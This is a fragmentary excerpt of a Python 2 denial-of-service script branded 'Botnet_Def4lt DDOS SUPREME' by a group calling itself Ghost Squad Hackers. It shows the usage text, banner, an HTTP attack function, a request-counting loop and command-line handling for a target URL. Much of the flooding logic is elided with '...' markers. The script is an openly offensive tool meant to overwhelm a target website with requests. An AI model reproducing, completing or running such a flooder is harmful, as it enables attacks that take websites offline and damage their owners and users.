...
def usage():
	print '---------------------------------------------------'
	print 'To use python botnet_def4lt.py <url>'
	print 'Botnet_Def4lt DDOS SUPREME '
	print "\a"
print \
"""                        .
...
Copyright: Def4lt - GHOST SQUAD HACKERS
"""
print '---------------------------------------------------'
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print '=>DEF4LT DOSER HTTP HITTING FULL<='
 			print '[*]\\>  ATTACKING   <//[*] '
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+500<request_counter) & (previous<>request_counter):
				print "%d Def4lt Up" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -Botnet Finish"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "PYTHON BOTNET_DEF4LT.PY POWERFULL DDOS"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
